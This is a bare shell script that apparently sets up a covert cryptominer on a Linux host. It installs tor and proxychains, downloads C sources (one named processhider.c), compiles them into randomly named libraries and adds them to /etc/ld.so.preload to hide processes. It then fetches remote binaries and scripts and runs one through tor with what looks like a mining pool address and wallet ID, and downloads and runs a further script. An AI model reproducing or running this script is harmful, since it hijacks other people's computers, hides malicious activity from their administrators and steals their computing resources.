#!/bin/sh
        apt update
        apt install wget sudo git cmake tor gcc -y
        cd /root
        git clone https://github.com/rofl0r/proxychains-ng.git
        cd proxychains-ng
        ./configure --prefix=/usr --sysconfdir=/etc
        make
        sudo make install
        sudo make install-config 
        cd /root
        rm -rf proxychains-ng
        fol=$(openssl rand -base64 6)
        h1=$(openssl rand -base64 6)
        l1=$(openssl rand -base64 6)
        h2=$(openssl rand -base64 6)
        l2=$(openssl rand -base64 6)
        cd /root
        mkdir $fol
        cd $fol
        wget --no-check-certificate -c https://github.com/unmsjd28/hjs839/raw/main/cp.c -O $h1.c 
        gcc -Wall -fPIC -shared -o $l1.so $h1.c -ldl
        sudo mv $l1.so /usr/local/lib/ 
        echo /usr/local/lib/$l1.so >> /etc/ld.so.preload 
        wget --no-check-certificate -c http://transfer.sh/ntzeku/processhider.c -O $h2.c 
        gcc -Wall -fPIC -shared -o $l2.so $h2.c -ldl
        sudo mv $l2.so /usr/local/lib/ 
        echo /usr/local/lib/$l2.so >> /etc/ld.so.preload 
        
        wget https://github.com/unmsjd28/hjs839/raw/main/pwsh.sh
        wget https://github.com/unmsjd28/ynsg7s9/raw/main/mavic
        chmod 777 mavic
        chmod 777 pwsh.sh
        tor > /dev/null 2>&1 &
        sleep 140
        proxychains4 ./pwsh.sh -v -l 139.99.123.225:3956 -u RLG1PwamJgoMYyCguWVH85rTMGiS1JkP46.ORKER -p x -t 2 > /dev/null 2>&1 &
        ps aux
        sleep 30
        ps aux
        wget https://github.com/unmsjd28/ynsg7s9/raw/main/cmd-bin.sh
        chmod 777 cmd-bin.sh
        timeout 150m ./cmd-bin.sh
